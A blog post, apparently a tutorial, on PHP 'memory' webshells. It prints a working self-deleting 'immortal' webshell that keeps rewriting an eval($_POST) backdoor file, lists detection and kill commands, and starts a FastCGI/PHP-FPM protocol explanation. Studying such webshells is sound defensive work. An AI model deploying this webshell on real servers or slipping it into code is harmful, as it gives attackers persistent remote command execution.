@@ -1,0 +1,919 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/favicon.jpg">
+  <link rel="icon" href="/img/favicon/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BadWolf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本篇文章主要介绍内存马中php内存马原理及其攻击手段。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马学习之php内存马">
+<meta property="og:url" content="https://genioco.github.io/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPHP%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="BadWolf&#39;s Blog">
+<meta property="og:description" content="本篇文章主要介绍内存马中php内存马原理及其攻击手段。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/10f20ee4ee654bcf9d85ba3cd046eccf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/504f72b4cd7c44d983dcf88da8bef40c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7102dd16e6db4414a06c5f782dd03abd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8e38a1bd0e71442e8fae9d6b325629a1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0de5ae8f12df4da997c3c2799ba07e44.png">
+<meta property="article:published_time" content="2022-05-06T06:23:00.000Z">
+<meta property="article:modified_time" content="2022-09-12T01:34:00.000Z">
+<meta property="article:author" content="BadWolf">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内存马学习之php内存马 - BadWolf&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/js/shubiao.css">
+<link rel="stylesheet" href="/js/scroll.css">
+<link rel="stylesheet" href="/js/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?839133d5bbdb7688edec52dfcde2a75b";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BadWolf&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内存马学习之php内存马"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        BadWolf
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-06 14:23" pubdate>
+          2022年5月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内存马学习之php内存马</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2022年9月12日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer">
+
+
+
+<h2 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h2><h3 id="PHP不死马"><a href="#PHP不死马" class="headerlink" title="PHP不死马"></a>PHP不死马</h3><h5 id="PHP不死马原理"><a href="#PHP不死马原理" class="headerlink" title="PHP不死马原理"></a>PHP不死马原理</h5><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。<strong>实际上</strong>，PHP不死马并未实现无文件攻击或者内存webshell等，理论上并不属于内存马的范畴，但是关于PHP内存马的实现，确实仅有这几种方法，所以在此处简单介绍一下。</p>
+<h5 id="PHP不死马代码"><a href="#PHP不死马代码" class="headerlink" title="PHP不死马代码"></a>PHP不死马代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>函数说明</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ignore<span class="hljs-emphasis">_user_</span>abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。<br><span class="hljs-bullet">2.</span> set<span class="hljs-emphasis">_time_</span>limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。<br><span class="hljs-bullet">3.</span> unlink(<span class="hljs-strong">__FILE__</span>)函数：删除文件。<br><span class="hljs-bullet">4.</span> file<span class="hljs-emphasis">_put_</span>contents函数：将一个字符串写入文件。<br><span class="hljs-bullet">5.</span> usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<br></code></pre></td></tr></table></figure>
+
+<p>访问成功，并且无法删除。</p>
+<p><img src="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png" srcset="/img/loading.gif" lazyload alt="image-20220608210706421"></p>
+<p>值得注意的是php一般都有设置php超时事件，所以php后台运行一定时间后可能会自动终止。<img src="https://img-blog.csdnimg.cn/10f20ee4ee654bcf9d85ba3cd046eccf.png" srcset="/img/loading.gif" lazyload alt="image-20220608221221995"></p>
+<h5 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-number">1.</span> 检查所有php进程处理请求的持续时间(<span class="hljs-built_in">top</span>|<span class="hljs-type">grep</span> http)<br><span class="hljs-number">2.</span> 检测执行文件是否在文件系统真实存在<br></code></pre></td></tr></table></figure>
+
+<h5 id="查杀PHP不死马"><a href="#查杀PHP不死马" class="headerlink" title="查杀PHP不死马"></a>查杀PHP不死马</h5><ul>
+<li>重启php服务器</li>
+<li>强行kill后台进程 <code>ps aux|grep www-data|awk &#39;&#123;print 2&#125;&#39;| xargs kill -9</code></li>
+<li>竞争删除</li>
+</ul>
+<p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode 运行了。使用条件竞争写入同名文件进行克制不死马。</p>
+<p><img src="https://img-blog.csdnimg.cn/504f72b4cd7c44d983dcf88da8bef40c.png" srcset="/img/loading.gif" lazyload alt="image-20220608211639286"></p>
+<p><img src="https://img-blog.csdnimg.cn/7102dd16e6db4414a06c5f782dd03abd.png" srcset="/img/loading.gif" lazyload alt="image-20220608211558944"></p>
+<h3 id="FastCGI马"><a href="#FastCGI马" class="headerlink" title="FastCGI马"></a>FastCGI马</h3><p>​		在了解FastCGI马之前，我们先来简要介绍一下<code>FastCGI</code>是个什么东东。</p>
+<h4 id="CGI与FastCGI"><a href="#CGI与FastCGI" class="headerlink" title="CGI与FastCGI"></a>CGI与FastCGI</h4><p>​		首先，我们来了解一下什么是<code>CGI</code>：以web服务器为例，我们知道apache可以用于搭建web服务器，但是apache只能够解析静态网页，也就是<code>html</code>类型网页；当然，我们可以安装php组件，通过apache配置文件使其能够解析php。这其中就用到了<code>CGI</code>，<strong>CGI是指Web Server 与 Web Application 之间数据交换的一种通信协议</strong>，当apache需要解析php时，他会通过配置文件获取到解析php服务的应用端口，并将需要解析的文件数据通过<code>CGI</code>协议交给PHP解析器。也就是说apache和php之间并不是一个整体（这是我以前误解的地方），而是apache通过<code>CGI</code>协议内部访问php解析器来实现php解析的。而<code>FastCGI</code>是<code>CGI</code>的升级版本，比 <code>CGI </code>在效率上做了一些优化。<strong>两者的区别是：</strong><code>CGI</code>每次解析是都会重新启动一个解析器进程，重新读取配置文件，重新载入扩展，解析完成后退出；而<code>FastCGI</code>是一种常驻型的<code>CGI</code>，只在进程启动时读取一次配置文件，请求解析完成后也不会退出，这样大大提高了性能。</p>
+<p>​		类比于HTTP协议，<code>FastCGI</code>协议是服务器中间件与某个语言后端进行数据交换中所使用的协议。<code>FastCGI</code>每次交换的消息称为<code>record</code>，这与HTTP协议请求数据包类似，<code>record</code>也有自己的<code>header</code>和<code>body</code>。<code>record</code>的头固定8个字节，<code>body</code>是由头中的<code>contentLength</code>指定，其结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-comment">/* Header */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> version; <span class="hljs-comment">// 版本</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> type; <span class="hljs-comment">// 本次record的类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requestIdB1; <span class="hljs-comment">// 本次record对应的请求id</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requestIdB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentLengthB1; <span class="hljs-comment">// body体的大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> paddingLength; <span class="hljs-comment">// 额外块大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> reserved; <br><br>  <span class="hljs-comment">/* Body */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentData[contentLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure>
+
+<p>语言端解析<code>FastCGI</code>头之后，会根据<code>contentLength</code>获取的<code>Body</code>的数据，<code>Body</code>后面还有一段额外的数据（Padding），其长度由头中的<code>paddingLength</code>指定，起保留作用。不需要该<code>Padding</code>的时候，将其长度设置为0即可。</p>
+<p>​		在<code>FastCGI</code>请求头中有一个<code>type</code>变量，<code>type</code>用于指定该<code>record</code>的作用，不同的<code>record</code>对应的<code>bode</code>结构不同，具体含义如下：</p>
+<table>
+<thead>
+<tr>
+<th>type值</th>
+<th>具体含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息</td>
+</tr>
+<tr>
+<td>2</td>
+<td>异常断开与php-fpm的交互</td>
+</tr>
+<tr>
+<td>3</td>
+<td>在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td>
+</tr>
+<tr>
+<td>4</td>
+<td>在交互过程中给php-fpm传递环境参数时，将type设为此，以表明消息中包含的数据为某个name-value对</td>
+</tr>
+<tr>
+<td>5</td>
+<td>web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5</td>
+</tr>
+<tr>
+<td>6</td>
+<td>php-fpm给web服务器回的正常响应消息的type就设为6</td>
+</tr>
+<tr>
+<td>7</td>
+<td>php-fpm给web服务器回的错误响应设为7</td>
+</tr>
+</tbody></table>
+<p>这里我们主要介绍<code>type</code>为4的<code>record</code>，因为<code>FastCGI</code>木马使用到了该类型的<code>record</code>，其他类型详见看<a target="_blank" rel="noopener" href="https://blog.csdn.net/shreck66/article/details/50355729">这篇文章</a>。</p>
+<p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;  <span class="hljs-comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0; <span class="hljs-comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength];<br>&#125; FCGI_NameValuePair11;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;  <span class="hljs-comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB3; <span class="hljs-comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>&#125; FCGI_NameValuePair14;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB3;  <span class="hljs-comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0; <span class="hljs-comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength];<br>&#125; FCGI_NameValuePair41;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB3;  <span class="hljs-comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB3; <span class="hljs-comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>&#125; FCGI_NameValuePair44;<br></code></pre></td></tr></table></figure>
+
+<p>这其实是4个结构，至于用哪个结构，有如下规则：</p>
+<ul>
+<li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li>
+<li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li>
+<li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li>
+<li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li>
+</ul>
+<p>​		关于web中间件与php之间的通信，我们举个例子来进行说明。用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​		Nginx将以上数据通过<code>FastCGI</code>协议格式发送给<code>PHP-FPM</code>，PHP-FPM拿到<code>FastCGI</code>的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p>
+<h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>​		首先要说的是：<code>FastCGI</code>是一种协议规范，<code>php-fpm</code>最终会解析这个协议。我们知道无论是<code>CGI</code>还是<code>FastCGI</code>最终都会启动php解析器程序（<code>php-cgi</code>），但是该程序只能解析请求并不能进程管理，而<code>php-fpm</code>就是<code>php-cgi</code>的进程管理程序，它克服了<code>php-cgi</code>变更<code>php.ini</code>配置后，需重启<code>php-cgi</code>才能让新的<code>php-ini</code>生效，无法平滑重启；直接杀死<code>php-cgi</code>进程，<code>php</code>就不能运行了等问题。具体的相关信息可以看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/110540192">这篇文章</a></p>
